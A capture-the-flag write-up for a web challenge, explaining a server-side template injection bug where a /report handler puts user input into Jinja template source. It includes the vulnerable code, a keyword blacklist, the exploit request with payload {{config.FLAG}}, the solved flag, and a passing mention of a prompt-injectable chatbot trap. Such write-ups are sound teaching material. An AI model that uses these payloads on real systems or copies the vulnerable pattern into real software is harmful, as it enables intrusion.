# SEAM writeup

## Task

We are given a web challenge called `SEAM` worth `1000` points with the following description:

```text
LabyrinthCorp has deployed an internal employee portal. You have access to register an account. Find a way to extract the flag.
```

Flag format:

```text
THEM?!CTF{...}
```

## Recon

After registering and logging in, the interesting surface looks like this:

| Route | Notes |
|---|---|
| `/` | Login page |
| `/register` | Account creation |
| `/login` | Auth |
| `/dashboard` | Main portal |
| `/report` | Bug report submission, interesting |
| `/dashboard/admin` | Redirects to `/api/flag` |
| `/api/flag` | Redirects back to `/dashboard/admin` |
| `/api/chat` | AI chatbot |
| `/robots.txt` | A pile of fake hidden paths |

There are also several obvious traps:

- fake creds in HTML comments
- a redirect loop between `/dashboard/admin` and `/api/flag`
- a chatbot that returns a fake flag after prompt injection
- honeypot backup files and fake admin pages

So the intended path is probably elsewhere.

## The interesting endpoint

The route that stands out is `/report`.

Its handler contains a branch that is only taken when:

- `Content-Type` contains `text/plain`
- `Referer` contains the string `report`

In that branch, the server manually parses the raw request body and extracts:

```python
name = params.get('name', 'User')
```

Then it builds a template string like this:

```python
tpl = f"<p>Thank you, {name}! Your report has been received...</p>"
return _sandbox.from_string(tpl).render(config=ctx_config)
```

This is the bug.

The user-controlled `name` is inserted directly into the **template source** using an f-string, and only after that the result is passed into Jinja for rendering.

That is classic SSTI.

## Why the flag is reachable directly

The render context includes:

```python
ctx_config = {'FLAG': _player_flag(request)}
```

So the template already has access to:

```jinja2
{{config.FLAG}}
```

That means we do **not** need:

- Jinja sandbox escape
- Python object traversal
- RCE

The flag is already sitting in the template context.

## Blacklist review

The challenge tries to stop obvious payloads with a blacklist like:

```python
BLACKLIST = ['__', 'os', 'subprocess', 'popen', 'system',
             'eval', 'exec', 'import', 'open', 'builtins',
             'globals', 'locals', 'getattr', 'setattr',
             '|attr', 'request', 'lipsum', 'cycler', 'joiner',
             'namespace', 'range(', 'dict(', 'class(']
```

The input is normalized before checking, so whitespace tricks are not useful.

But none of that matters here, because:

```jinja2
{{config.FLAG}}
```

contains none of the blocked substrings.

So the intended exploit is much simpler than a normal Jinja breakout.

## Exploitation

To hit the vulnerable branch, we need:

- a valid session
- `Content-Type: text/plain`
- `Referer` containing `report`

Then we send:

```http
POST /report HTTP/1.1
Host: <host>
Cookie: lc_session=<your_session>
Content-Type: text/plain
Referer: http://<host>/report

name={{config.FLAG}}
```

The server interpolates that into the template source and renders it.

## Result

The response includes the rendered flag directly:

```html
<p>Thank you, THEM?!CTF{s5t1_thr0ugh_th3_s34ms}! Your report has been received and will be reviewed within 3–5 business days.</p>
```

## Why this works

The root issue is:

1. user input is inserted into a template string with an f-string
2. that string is later parsed as a Jinja template

So the attacker controls template syntax, not just template data.

This is textbook SSTI.

The important nuance is that `config` here is not Flask's global app config object.
It is just a plain dictionary with the flag already inside it.

So the shortest path is not sandbox escape or code execution, but simply:

```jinja2
{{config.FLAG}}
```

## Final flag

```text
THEM?!CTF{s5t1_thr0ugh_th3_s34ms}
```

